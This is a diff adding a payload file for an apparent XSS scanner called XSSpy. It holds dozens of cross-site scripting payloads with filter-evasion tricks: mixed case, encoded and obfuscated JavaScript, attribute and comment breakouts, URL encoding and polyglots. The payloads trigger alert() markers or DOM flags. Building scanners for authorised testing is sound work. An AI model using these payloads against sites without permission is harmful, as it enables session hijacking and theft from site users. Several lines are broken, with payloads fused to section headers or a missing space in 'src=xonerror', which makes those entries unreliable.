@@ -1,0 +1,113 @@
+# XSSpy Scanner v1.0 Payload File (v3 - Enhanced Bypasses)
+# Contains payload templates ({marker} is replaced) and static payloads.
+# Adapted for DOM XSS checks and Stored XSS correlation.
+# Includes more advanced bypass/evasion techniques.
+
+# --- Payloads using alert() with {marker} (for Stored XSS Correlation) ---
+
+# Basic Tags & Events
+<img src=x onerror=alert('IMG_ONERROR_{marker}')>
+<svg onload=alert('SVG_ONLOAD_{marker}')>
+<body onload=alert('BODY_ONLOAD_{marker}')>
+<details open ontoggle=alert('DETAILS_ONTOGGLE_{marker}')><summary>X</summary></details>
+<input autofocus onfocus=alert('INPUT_ONFOCUS_{marker}')>
+<input onmouseover=alert('INPUT_ONMOUSEOVER_{marker}')>
+<input oninput=alert('INPUT_ONINPUT_{marker}')>
+<textarea oninput=alert('TEXTAREA_ONINPUT_{marker}')></textarea>
+<video onerror=alert('VIDEO_ONERROR_{marker}')><source src=x></video>
+<audio onerror=alert('AUDIO_ONERROR_{marker}')><source src=x></audio>
+<marquee onstart=alert('MARQUEE_ONSTART_{marker}')>XSS</marquee>
+<isindex type=image src=1 onerror=alert('ISINDEX_ONERROR_{marker}')>
+<div style='width:1px;height:1px' onpointerrawupdate=alert('DIV_POINTER_{marker}')>X</div>
+<a href="javascript:alert('A_HREF_{marker}')">Click</a>
+<form action="javascript:alert('FORM_ACTION_{marker}')"><input type=submit>
+<iframe src="javascript:alert('IFRAME_SRC_{marker}')"></iframe>
+<iframe srcdoc="<script>alert('IFRAME_DOC_{marker}')</script>"></iframe>
+<object data="javascript:alert('OBJECT_DATA_{marker}')"></object>
+<embed src="javascript:alert('EMBED_SRC_{marker}')">
+
+# Case Variations (More Examples)
+<iMg sRc=x OnErRoR=alert('IMG_CASE_{marker}')>
+<SvG oNlOaD=alert('SVG_CASE_{marker}')>
+<DeTaIlS open OnToGgLe=alert('DETAILS_CASE_{marker}')><summary>X</summary></DeTaIlS>
+<InPuT AuToFoCuS OnFoCuS=alert('INPUT_CASE_{marker}')>
+<ScRiPt>alert('SCRIPT_CASE_{marker}')</ScRiPt>
+<BoDy OnLoAd=alert('BODY_CASE_{marker}')>
+
+# Simple JS Obfuscation / Encoding
+<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,39,74,83,70,67,95,123,109,97,114,107,101,114,125,39,41))> <img src=x onerror=setTimeout('alert("TIMEOUT_{marker}")',0)>
+<img src=x onerror="[].constructor.constructor(alert('CONSTRUCTOR_{marker}'))()">
+<a href="&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;alert('HEXJS_{marker}')">Click</a>
+<img src=x onerror=window['alert']('WIN_ALERT_{marker}')>
+<img src=x onerror=top['alert']('TOP_ALERT_{marker}')>
+<img src=x onerror=self['alert']('SELF_ALERT_{marker}')>
+<img src=x onerror=eval(atob('YWxlcnQoJ0Jhc2U2NF97bWFya2VyfScp'))> <svg onload=eval(location.hash.slice(1))><a href=#alert('HASH_EVAL_{marker}')>ClickMe</a> # Attribute Breakouts (More variations)
+"><img src=x onerror=alert('DQ_BREAK_IMG_{marker}')>
+'><img src=x onerror=alert('SQ_BREAK_IMG_{marker}')>
+"><svg onload=alert('DQ_BREAK_SVG_{marker}')>
+'><svg onload=alert('SQ_BREAK_SVG_{marker}')>
+" autofocus onfocus=alert('DQ_BREAK_FOCUS_{marker}')>
+' autofocus onfocus=alert('SQ_BREAK_FOCUS_{marker}')>
+ autofocus onfocus=alert('UQ_BREAK_FOCUS_{marker}') "`><img src=x onerror=alert('BT_BREAK_IMG_{marker}')>` ` autofocus onfocus=alert('BT_BREAK_FOCUS_{marker}')>`
+"><details open ontoggle=alert('DQ_BREAK_DETAILS_{marker}')><summary>X</summary></details>
+'><details open ontoggle=alert('SQ_BREAK_DETAILS_{marker}')><summary>X</summary></details>
+
+# Comment Breakout / Obfuscation
+--><img src=x onerror=alert('COMM_BREAK_IMG_{marker}')>
+<![CDATA[<script>alert('CDATA_BREAK_{marker}')</script>]]> <img src=xonerror=alert('IMG_COMM_EVT_{marker}')>
+<svg onload=alert('SVG_COMM_LOAD_{marker}')>
+
+# HTML Entity Encoding (More variations)
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#39;HTML_DEC_{marker}&#39;&#41;>
+<img src=x onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x27;HTML_HEX_{marker}&#x27;&#x29;>
+<img src=x onerror=a&#x006C;ert('HEX_PARTIAL_{marker}')> <img src=x onerror=a&#108;ert('DEC_PARTIAL_{marker}')> &lt;script&gt;alert('ENTITY_TAG_{marker}')&lt;/script&gt; # URL Encoding Variations (Primarily for query params / DOM sources)
+%3Cscript%3Ealert('URL_ENC_TAG_{marker}')%3C/script%3E
+%3Csvg%20onload=alert('URL_ENC_SVG_{marker}')%3E
+%22%3E%3Cimg%20src=x%20onerror=alert('URL_ENC_BREAK_{marker}')%3E # Mixed Case + Events
+<iMg sRc=x oNMoUsEoVeR=alert('MIX_MOUSEOVER_{marker}')>
+<DeTaIlS oPeN oNtOgGlE=alert('MIX_TOGGLE_{marker}')><summary>X</summary></DeTaIlS>
+<InPuT aUtOfOcUs oNbLuR=alert('MIX_BLUR_{marker}')> <input>
+
+# Newer / Less Common Events
+<div onauxclick=alert('DIV_AUXCLICK_{marker}')>Right Click Me</div>
+<div oncontextmenu=alert('DIV_CONTEXT_{marker}')>Right Click Me 2</div>
+<div style='animation: x;' onanimationend=alert('DIV_ANIMEND_{marker}')></div> <style>@keyframes x {}</style> <input oninvalid=alert('INPUT_INVALID_{marker}') required> <input type=submit> <input onsearch=alert('INPUT_SEARCH_{marker}') type=search> # Polyglots (Simplified - attempt to work in multiple contexts)
+javascript:"/*'/*`/*--></title></style></textarea></script></xmp><svg/onload=alert('POLY1_{marker}')>` `-->'/*</title></style></textarea></script><svg/onload=alert('POLY2_{marker}')>/**/`
+'=alert('POLY3_{marker}')//`</script><svg/onload=alert('POLY3_{marker}')>
+
+
+# --- Payloads using the specific DOM Change (Static - No Marker Correlation) ---
+
+# Basic Tags & Events
+<img src=x onerror="document.body.setAttribute('data-xsspy-success','true')">
+<img src=x onerror='document.body.setAttribute("data-xsspy-success","true")'>
+<svg onload="document.body.setAttribute('data-xsspy-success','true')">
+<details open ontoggle="document.body.setAttribute('data-xsspy-success','true')"><summary>X</summary></details>
+<input autofocus onfocus="document.body.setAttribute('data-xsspy-success','true')">
+<input onmouseover="document.body.setAttribute('data-xsspy-success','true')"> Test
+<video onerror="document.body.setAttribute('data-xsspy-success','true')"><source src=x></video>
+<audio onerror="document.body.setAttribute('data-xsspy-success','true')"><source src=x></audio>
+<marquee onstart="document.body.setAttribute('data-xsspy-success','true')">XSS</marquee>
+<div style='width:1px;height:1px' onpointerenter="document.body.setAttribute('data-xsspy-success','true')">X</div>
+
+# Case Variations
+<iMg sRc=x OnErRoR="document.body.setAttribute('data-xsspy-success','true')">
+<SvG oNlOaD="document.body.setAttribute('data-xsspy-success','true')">
+
+# Simple JS Obfuscation / Encoding
+<img src=x onerror=eval(atob('ZG9jdW1lbnQuYm9keS5zZXRBdHRyaWJ1dGUoJ2RhdGEteHNzcHktc3VjY2VzcycsJ3RydWUnKQ=='))> <img src=x onerror=setTimeout(document.body.setAttribute('data-xsspy-success','true'),0)> <img src=x onerror=window['document']['body']['setAttribute']('data-xsspy-success','true')> <img src=x onerror=&#x64;&#x6f;&#x63;&#x75;&#x6d;&#x65;&#x6e;&#x74;&#x2e;&#x62;&#x6f;&#x64;&#x79;&#x2e;&#x73;&#x65;&#x74;&#x41;&#x74;&#x74;&#x72;&#x69;&#x62;&#x75;&#x74;&#x65;&#x28;&#x27;&#x64;&#x61;&#x74;&#x61;&#x2d;&#x78;&#x73;&#x73;&#x70;&#x79;&#x2d;&#x73;&#x75;&#x63;&#x63;&#x65;&#x73;&#x73;&#x27;&#x2c;&#x27;&#x74;&#x72;&#x75;&#x65;&#x27;&#x29;> # Attribute Breakouts
+"><img src=x onerror="document.body.setAttribute('data-xsspy-success','true')">
+'><img src=x onerror="document.body.setAttribute('data-xsspy-success','true')">
+" autofocus onfocus="document.body.setAttribute('data-xsspy-success','true')">
+' autofocus onfocus="document.body.setAttribute('data-xsspy-success','true')">
+ autofocus onfocus="document.body.setAttribute('data-xsspy-success','true')" "`><img src=x onerror="document.body.setAttribute('data-xsspy-success','true')">`
+
+# Comment Breakout / Obfuscation
+--><svg onload="document.body.setAttribute('data-xsspy-success','true')">
+<img src=xonerror="document.body.setAttribute('data-xsspy-success','true')">
+
+
+# --- Potentially Useful Payloads (May or may not trigger current confirmation) ---
+# These are less likely to work with current confirmation but good to have
+<xmp><script>alert('XMP_TAG_{marker}')</script></xmp> <style onload=alert('STYLE_ONLOAD_{marker}')></style> <link rel=stylesheet href="javascript:alert('LINK_HREF_{marker}')"> <math><a xlink:href="javascript:alert('MATH_XLINK_{marker}')">CLICK</a></math> <form><button formaction="javascript:alert('BUTTON_FORMACTION_{marker}')">CLICK
+
